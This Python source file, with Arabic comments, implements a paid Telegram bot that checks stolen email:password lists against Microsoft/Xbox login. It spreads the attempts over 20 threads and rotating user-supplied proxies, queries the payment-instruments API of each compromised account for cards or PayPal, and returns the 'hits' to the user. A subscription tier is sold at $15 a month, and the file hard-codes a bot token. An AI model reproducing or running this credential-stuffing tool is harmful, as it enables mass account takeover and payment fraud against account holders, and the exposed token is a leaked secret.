import logging
import asyncio
import time
import requests
import random
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
OWNER_USERNAME = "r1ivk"

vip_subscriptions = {}
active_scans = {}
user_proxies = {}  # لتخزين قائمة البروكسيات الخاصة بكل مستخدم

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

def is_user_vip(user_id, username):
    if username == OWNER_USERNAME:
        return True
    if user_id in vip_subscriptions:
        if datetime.now() < vip_subscriptions[user_id]:
            return True
        else:
            del vip_subscriptions[user_id]
            return False
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("🪟 Microsoft Checker (Xbox/MC)", callback_data="chk_microsoft")],
        [InlineKeyboardButton("🎁 Xbox Codes & Balance Checker", callback_data="chk_xbox_codes")],
        [InlineKeyboardButton("🌐 Upload Proxies List", callback_data="upload_proxy")],
        [InlineKeyboardButton("💎 VIP Subscription Plans", callback_data="subscription")],
        [InlineKeyboardButton("📊 My Statistics", callback_data="stats")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    welcome_text = f"Welcome, {user.first_name}, to `r1ivk High-Speed Checker`.\n\nSelect a service or upload your proxies first:"
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.callback_query:
        await update.callback_query.message.edit_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data.startswith("chk_"):
        checker_type = data.replace("chk_", "")
        context.user_data['checker_type'] = checker_type
        await query.message.edit_text(f"🚀 **{checker_type.upper()} Checker Selected.**\n\nPlease send your combo file (`.txt`) in `email:password` format:", parse_mode="Markdown")
    elif data == "upload_proxy":
        context.user_data['waiting_for_proxy'] = True
        await query.message.edit_text("🌐 **Please send your proxies file (`.txt`) now:**\nFormats supported: `IP:Port` or `ip:port:user:pass`", parse_mode="Markdown")
    elif data == "subscription":
        keyboard = [[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]
        await query.message.edit_text(f"💎 **VIP Monthly Plans:** `$15 / Month`\nContact: @{OWNER_USERNAME}", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    elif data == "stats":
        user_id = query.from_user.id
        is_vip = is_user_vip(user_id, query.from_user.username)
        proxies_count = len(user_proxies.get(user_id, []))
        keyboard = [[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]
        await query.message.edit_text(f"📊 **Status:** `{'VIP Member' if is_vip else 'Free User'}`\n🌐 **Loaded Proxies:** `{proxies_count}`", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    elif data == "main_menu":
        await start(update, context)

async def add_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.username != OWNER_USERNAME or not context.args:
        return
    target_id = int(context.args[0])
    vip_subscriptions[target_id] = datetime.now() + timedelta(days=30)
    await update.message.reply_text(f"✅ User `{target_id}` upgraded to VIP for 30 days.", parse_mode="Markdown")

async def remove_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.username != OWNER_USERNAME or not context.args:
        return
    target_id = int(context.args[0])
    vip_subscriptions.pop(target_id, None)
    await update.message.reply_text(f"🚫 VIP removed from `{target_id}`.", parse_mode="Markdown")

# دالة الفحص عبر الأقسام مع دعم البروكسي
def verify_microsoft_account_with_proxy(email, password, checker_type, proxy=None):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
    })
    
    proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    
    payload = {
        'login': email,
        'passwd': password,
        'grant_type': 'password',
        'client_id': '000000004817001b',
        'scope': 'service::user.auth.xboxlive.com::MBI_SSL'
    }
    
    try:
        response = session.post("https://login.live.com/accessToken.srf", data=payload, proxies=proxies_dict, timeout=7)
        data = response.json()
        
        if "access_token" in data:
            access_token = data["access_token"]
            hit_detail = "Valid Login"
            
            if checker_type == "xbox_codes":
                headers = {"Authorization": f"Bearer {access_token}"}
                balance_res = session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstruments", headers=headers, proxies=proxies_dict, timeout=5)
                if balance_res.status_code == 200:
                    instruments = balance_res.json()
                    balance_found = "No Payment Method"
                    for item in instruments:
                        if item.get("paymentMethodFamily") in ["Check", "CreditCard", "PayPal"]:
                            balance_found = "Active Payment Method Found"
                            break
                    hit_detail = f"Hit | {balance_found}"
                else:
                    hit_detail = "Hit | Valid Account"
            
            return True, hit_detail
        else:
            return False, "Bad Credentials"
    except Exception:
        return False, "Proxy/Network Error"

# محرك الفحص فائق السرعة بالخيوط المتعددة (ThreadPoolExecutor)
async def run_live_scanner(lines, checker_type, chat_id, message_id, context, proxies_list):
    total = len(lines)
    checked = 0
    hits = 0
    bad = 0
    errors = 0
    start_time = time.time()
    
    active_scans[chat_id] = True
    hits_list = []

    async def update_dashboard(status_text="Running..."):
        elapsed = int(time.time() - start_time)
        elapsed_str = time.strftime('%H:%M:%S', time.gmtime(elapsed))
        cpm = int((checked / max(1, elapsed)) * 60)
        
        progress_pct = (checked / total) * 100 if total > 0 else 100
        filled_blocks = int(progress_pct // 10)
        bar = "█" * filled_blocks + "░" * (10 - filled_blocks)
        
        text = (
            f"🔥 **HIGH-SPEED SCANNER STATS**\n\n"
            f"📊 Total: `{total}`\n"
            f"✅ Checked: `{checked}`\n"
            f"❌ Bad: `{bad}`\n"
            f"🎯 Hits: `{hits}`\n"
            f"⚠️ Errors: `{errors}`\n\n"
            f"Progress: `{progress_pct:.1f}%`\n`[{bar}]`\n\n"
            f"⚡ CPM: `{cpm}`\n"
            f"⏱ Elapsed: `{elapsed_str}`\n"
            f"📌 Status: `{status_text}`"
        )
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]])
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode="Markdown", reply_markup=keyboard)
        except Exception:
            pass

    def check_single(combo):
        nonlocal checked, hits, bad, errors
        if not active_scans.get(chat_id, True):
            return
        if ':' not in combo:
            errors += 1
            return
            
        email, password = combo.split(':', 1)
        proxy = random.choice(proxies_list) if proxies_list else None
        
        is_hit, details = verify_microsoft_account_with_proxy(email, password, checker_type, proxy)
        
        checked += 1
        if is_hit:
            hits += 1
            hits_list.append(f"[HIT] {email}:{password} | {details}")
        else:
            if "Error" in details:
                errors += 1
            else:
                bad += 1

    # استخدام 20 خيطاً متزامناً (Threads) لسرعة صاروخية
    loop = asyncio.get_running_loop()
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [loop.run_in_executor(executor, check_single, combo) for combo in lines]
        
        while not all(f.done() for f in futures):
            if not active_scans.get(chat_id, True):
                break
            await update_dashboard("Scanning Blazing Fast...")
            await asyncio.sleep(1)
            
        await asyncio.gather(*futures, return_exceptions=True)

    active_scans.pop(chat_id, None)
    await update_dashboard("Completed ✅")
    
    if hits_list:
        file_name = f"r1ivk_hits_{chat_id}.txt"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write("\n".join(hits_list))
        with open(file_name, "rb") as f:
            await context.bot.send_document(chat_id=chat_id, document=f, caption=f"🎯 **Scan Finished! Total Hits: {hits}**", parse_mode="Markdown")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    
    file = await update.message.document.get_file()
    file_path = f"downloaded_{user.id}.txt"
    await file.download_to_drive(file_path)
    
    # فحص إذا كان الملف عبارة عن بروكسيات
    if context.user_data.get('waiting_for_proxy'):
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            proxies = [line.strip() for line in f if line.strip()]
        user_proxies[user.id] = proxies
        context.user_data['waiting_for_proxy'] = False
        await update.message.reply_text(f"✅ Successfully loaded `{len(proxies)}` proxies!", parse_mode="Markdown")
        return

    # فحص إذا كان الملف عبارة عن كومبو
    checker_type = context.user_data.get('checker_type')
    if not checker_type:
        await update.message.reply_text("⚠️ Please select a checker type first using /start")
        return

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if ':' in line]
        
    if not lines:
        await update.message.reply_text("❌ The uploaded file is empty or invalid format.")
        return

    proxies_list = user_proxies.get(user.id, [])
    initial_msg = await update.message.reply_text(f"🚀 Initializing high-speed scanner (Proxies: {len(proxies_list)})...", parse_mode="Markdown")
    asyncio.create_task(run_live_scanner(lines, checker_type, chat_id, initial_msg.message_id, context, proxies_list))

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("vip", add_vip))
    app.add_handler(CommandHandler("unvip", remove_vip))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("High-Speed Checker Bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()
